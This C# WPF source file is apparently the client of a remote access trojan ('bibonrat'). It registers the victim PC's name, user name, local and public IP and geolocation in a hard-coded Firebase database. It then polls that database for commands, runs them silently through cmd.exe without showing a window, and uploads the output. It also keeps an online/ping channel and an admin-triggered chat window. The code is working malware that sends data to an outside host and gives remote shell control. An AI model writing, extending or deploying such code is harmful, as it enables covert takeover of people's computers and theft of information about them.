using Shared;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Timers;
using System.Web.Script.Serialization;      // System.Web.Extensions
using System.Windows;
using System.Collections.Generic;
using SharedChat; // чтобы видеть ChatWindow

namespace ClientBibon
{
    public partial class MainWindow : Window
    {
        private const string BaseUrl = "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app";
        private const string AuthToken = "";        // если не нужно – пусто
        private const string IPINFO_TOKEN = "";     // если есть токен: "token123"

        private string _pcKey;                      // "PC_45_23_54_32"
        private Timer _pingPollTimer;               // пинг от админки
        private string _lastPingToken = "";
        private System.Timers.Timer _adminOpenPoll;
        private ChatWindow _chat;

        // MainWindow.xaml.cs (ClientBibon)
        private System.Timers.Timer _cmdPollTimer;
        private string _lastCmdId = "";

        private string PathCmdNode() => $"PC List/{_pcKey}/Comands";
        private static string JsonEscape(string s)
        {
            if (s == null) return "";
            var sb = new System.Text.StringBuilder(s.Length + 32);
            foreach (var ch in s)
            {
                switch (ch)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '\"': sb.Append("\\\""); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    default:
                        if (ch < 32) sb.Append("\\u").Append(((int)ch).ToString("x4"));
                        else sb.Append(ch);
                        break;
                }
            }
            return sb.ToString();
        }


        public MainWindow()
        {
            InitializeComponent();

            // На случай жесткого завершения процесса
            AppDomain.CurrentDomain.ProcessExit += (s, e) =>
            {
                try
                {
                    if (!string.IsNullOrEmpty(_pcKey))
                    {
                        using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                        {
                            fb.PutRawJsonAsync(PathOnline("PC Online or offline"), "0").Wait(1000);
                            fb.PutRawJsonAsync(PathOnline("stop_time"),
                                "\"" + NowLocal() + "\"").Wait(1000);
                        }
                    }
                }
                catch { }
            };
        }

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            await RegisterAsync();
            await SetOnlineAsync(true);
            StartPingPoll();
            StartCmdPoll();

            // БЫЛО:
            // StartChatWatcher();

            // СТАЛО: реагируем только на команду админа
            StartAdminOpenWatcher(BaseUrl, AuthToken, _pcKey, Environment.UserName);
        }


        private async void Repeat_Click(object sender, RoutedEventArgs e)
        {
            await RegisterAsync();
            await SetOnlineAsync(true);
        }

        // ===================== ВСПОМОГАТЕЛЬНЫЕ ======================
        private static string EscapeJson(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string NowLocal() => DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");

        private string PathOnline(string leaf) { return "PC List/" + _pcKey + "/Online or ofline/" + leaf; }
        private string PathSysInfo(string leaf) { return "PC List/" + _pcKey + "/System Information/" + leaf; }

        private static string GetLocalIp()
        {
            try
            {
                foreach (var ni in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (ni.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ni))
                    {
                        var s = ni.ToString();
                        if (!s.StartsWith("169.254")) return s; // не APIPA
                    }
                }
            }
            catch { }
            return "";
        }

        private void StartAdminOpenWatcher(string baseUrl, string authToken, string pcKey, string myName)
        {
            _adminOpenPoll = new System.Timers.Timer(1000) { AutoReset = true };
            _adminOpenPoll.Elapsed += async (_, __) =>
            {
                try
                {
                    using (var fb = new FirebaseRtdb(baseUrl, authToken))
                    {
                        var v = await fb.GetJsonAsync($"PC List/{pcKey}/Chat/Control/AdminOpen");
                        bool adminWantsOpen = v == "1";

                        Dispatcher.Invoke(async () =>
                        {
                            if (adminWantsOpen)
                            {
                                // если админ просит открыть и окно ещё не открыто — открываем
                                if (_chat == null || !_chat.IsVisible)
                                {
                                    _chat = new SharedChat.ChatWindow(baseUrl, authToken, pcKey, myName, false);
                                    _chat.Show();
                                    // ChatWindow сам проставит ClientOpen=1 и ClientOnline=1
                                }
                            }
                            else
                            {
                                // админ закрыл у себя — закрываемся
                                if (_chat != null && _chat.IsVisible)
                                    _chat.Close(); // ChatWindow_Closing проставит ClientOpen=0/ClientOnline=0
                            }
                        });
                    }
                }
                catch { }
            };
            _adminOpenPoll.Start();
        }

        private class IpInfo
        {
            public string ip { get; set; }
            public string city { get; set; }
            public string region { get; set; }
            public string country { get; set; }
        }

        private static async Task<IpInfo> FetchIpInfoAsync(string token)
        {
            string url = "https://ipinfo.io/json";
            if (!string.IsNullOrEmpty(token)) url += "?token=" + token;

            using (var http = new HttpClient())
            {
                var json = await http.GetStringAsync(url);
                var ser = new JavaScriptSerializer();
                return ser.Deserialize<IpInfo>(json);
            }
        }

        private static async Task<string> FallbackPublicIpAsync()
        {
            using (var http = new HttpClient())
            {
                try { return (await http.GetStringAsync("https://api.ipify.org")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://checkip.amazonaws.com")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://ifconfig.me/ip")).Trim(); } catch { }
            }
            throw new Exception("Не удалось определить внешний IP.");
        }

        // ===================== РЕГИСТРАЦИЯ (создание структуры) ======================
        private async Task RegisterAsync()
        {
            try
            {
                // 1) Информация из ОС
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;
                string localIp = GetLocalIp();

                // 2) ipinfo
                var ipinfo = await FetchIpInfoAsync(IPINFO_TOKEN) ?? new IpInfo();
                string internetIp = !string.IsNullOrEmpty(ipinfo.ip) ? ipinfo.ip : await FallbackPublicIpAsync();

                // ключ узла
                _pcKey = "PC_" + pcName.Replace(".", "_") + "_" + userName.Replace(".", "_");

                using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                {
                    await fb.EnsureMapNodeAsync("PC List");

                    // --- Online or ofline ---
                    var onlineJson = "{ " +
                        "\"PC Online or offline\":1," +
                        "\"start_time\":\"" + NowLocal() + "\"" +
                        " }";
                    await fb.PutRawJsonAsync("PC List/" + _pcKey + "/Online or ofline", onlineJson);

                    // --- System Information ---
                    var sysJson = "{ " +
                        "\"PC Name\":\"" + EscapeJson(pcName) + "\"," +
                        "\"User Name\":\"" + EscapeJson(userName) + "\"," +
                        "\"Local IP\":\"" + EscapeJson(localIp) + "\"," +
                        "\"INTERNET IP\":\"" + EscapeJson(internetIp) + "\"," +
                        "\"Country\":\"" + EscapeJson(ipinfo.country ?? "") + "\"," +
                        "\"Region\":\"" + EscapeJson(ipinfo.region ?? "") + "\"," +
                        "\"City\":\"" + EscapeJson(ipinfo.city ?? "") + "\"" +
                        " }";
                    await fb.PutRawJsonAsync("PC List/" + _pcKey + "/System Information", sysJson);

                    Status.Text = "Создано: " + _pcKey + " ✅";
                }
            }
            catch (Exception ex)
            {
                Status.Text = "Ошибка регистрации: " + ex.Message;
            }
        }

        // ===================== ONLINE/OFFLINE + ПИНГ ======================
        private async Task SetOnlineAsync(bool online)
        {
            if (string.IsNullOrEmpty(_pcKey)) return;
            try
            {
                using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                {
                    await fb.PutRawJsonAsync(PathOnline("PC Online or offline"), online ? "1" : "0");
                }
                Status.Text = "Статус: " + (online ? "ON (1)" : "OFF (0)");
            }
            catch (Exception ex)
            {
                Status.Text = "Ошибка статуса: " + ex.Message;
            }
        }

        private void StartPingPoll()
        {
            if (_pingPollTimer != null) { _pingPollTimer.Stop(); _pingPollTimer.Dispose(); }
            _pingPollTimer = new Timer(2000);
            _pingPollTimer.AutoReset = true;
            _pingPollTimer.Elapsed += async (s, e) => { await PollPingAsync(); };
            _pingPollTimer.Start();
        }

        private async Task PollPingAsync()
        {
            if (string.IsNullOrEmpty(_pcKey)) return;

            try
            {
                using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                {
                    // читаем ping ВНУТРИ "Online or ofline"
                    var json = await fb.GetJsonAsync(PathOnline("ping"));
                    if (string.IsNullOrEmpty(json) || json == "null") return;

                    var token = json.Trim().Trim('"');
                    if (string.IsNullOrEmpty(token) || token == _lastPingToken) return;

                    // отвечаем туда же
                    await fb.PutRawJsonAsync(PathOnline("pong"), $"\"{token}\"");
                    await fb.PutRawJsonAsync(PathOnline("PC Online or offline"), "1");

                    _lastPingToken = token;
                }
            }
            catch { }
        }


        // ===================== ЗАКРЫТИЕ ======================
      


        private void StartCmdPoll()
        {
            if (_cmdPollTimer != null) { _cmdPollTimer.Stop(); _cmdPollTimer.Dispose(); }
            _cmdPollTimer = new System.Timers.Timer(1500);
            _cmdPollTimer.AutoReset = true;
            _cmdPollTimer.Elapsed += async (s, e) => await PollCommandAsync();
            _cmdPollTimer.Start();
        }

        private sealed class CmdDto
        {
            public string id { get; set; }
            public string cmd { get; set; }
            public string ts { get; set; }
            public string status { get; set; }
        }

        private static async Task<(int exitCode, string stdout, string stderr)> RunCommandAsync(string cmd)
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c chcp 65001>nul & " + cmd,   // переключаем консоль на UTF-8
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = System.Text.Encoding.UTF8,
                StandardErrorEncoding = System.Text.Encoding.UTF8
            };

            using (var p = System.Diagnostics.Process.Start(psi))
            {
                string stdout = await p.StandardOutput.ReadToEndAsync();
                string stderr = await p.StandardError.ReadToEndAsync();
                await Task.Run(() => p.WaitForExit());
                return (p.ExitCode, stdout, stderr);
            }
        }


        private async Task PollCommandAsync()
        {
            if (string.IsNullOrEmpty(_pcKey)) return;

            string id = "";
            string cmdText = "";
            string status = "new";

            try
            {
                // 1) читаем команду
                using (var fb = new Shared.FirebaseRtdb(BaseUrl, AuthToken))
                {
                    var json = await fb.GetJsonAsync(PathCmdNode());
                    if (string.IsNullOrEmpty(json) || json == "null") return;

                    var ser = new JavaScriptSerializer();
                    var d = ser.Deserialize<System.Collections.Generic.Dictionary<string, object>>(json)
                            ?? new System.Collections.Generic.Dictionary<string, object>();

                    id = d.ContainsKey("id") ? Convert.ToString(d["id"]) : "";
                    cmdText = d.ContainsKey("cmd") ? Convert.ToString(d["cmd"]) : "";
                    status = d.ContainsKey("status") ? Convert.ToString(d["status"]) : "new";

                    // выполнять ТОЛЬКО новые команды
                    if (string.IsNullOrWhiteSpace(id) || string.IsNullOrWhiteSpace(cmdText)) return;
                    if (status != "new") return;
                    if (id == _lastCmdId) return;

                    // «захватываем» команду
                    _lastCmdId = id;
                    var inProgress = "{"
                        + $"\"id\":\"{JsonEscape(id)}\","
                        + $"\"cmd\":\"{JsonEscape(cmdText)}\","
                        + "\"status\":\"running\","
                        + $"\"worker\":\"{JsonEscape(_pcKey)}\""
                        + "}";

                    await fb.PutRawJsonAsync(PathCmdNode(), inProgress);
                }

                // 2) выполняем
                // 2) выполняем
                int exitCode = -1;
                string stdout = "", stderr = "";
                try
                {
                    var r = await RunCommandAsync(cmdText);
                    exitCode = r.exitCode;
                    stdout = r.stdout;
                    stderr = r.stderr;
                }
                catch (Exception ex)
                {
                    stderr = ex.Message;
                }

                // 3) пишем РАЗДЕЛЬНО: сначала быстрый маленький ответ
                using (var fb = new Shared.FirebaseRtdb(BaseUrl, AuthToken))
                {
                    // done + код выхода (минимальный JSON) — прилетит почти мгновенно
                    await fb.PutRawJsonAsync(PathCmdNode() + "/status", "\"done\"");
                    await fb.PutRawJsonAsync(PathCmdNode() + "/exitCode", exitCode.ToString());
                    await fb.PutRawJsonAsync(PathCmdNode() + "/cmd", $"\"{JsonEscape(cmdText)}\"");
                    await fb.PutRawJsonAsync(PathCmdNode() + "/id", $"\"{JsonEscape(_lastCmdId)}\"");
                    await fb.PutRawJsonAsync(PathCmdNode() + "/worker", $"\"{JsonEscape(_pcKey)}\"");

                    // потом — крупные поля, но уже не блокируют отображение результата
                    var outSafe = Trunc(stdout, 60000); // ~60 KB
                    var errSafe = Trunc(stderr, 60000);
                    await fb.PutRawJsonAsync(PathCmdNode() + "/stdout", $"\"{JsonEscape(outSafe)}\"");
                    await fb.PutRawJsonAsync(PathCmdNode() + "/stderr", $"\"{JsonEscape(errSafe)}\"");
                }

            }
            catch
            {
                // не даём таймеру упасть
            }
        }
        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return "";
            if (s.Length <= max) return s;
            return s.Substring(0, max) + "\n... [truncated]";
        }



       



    }
}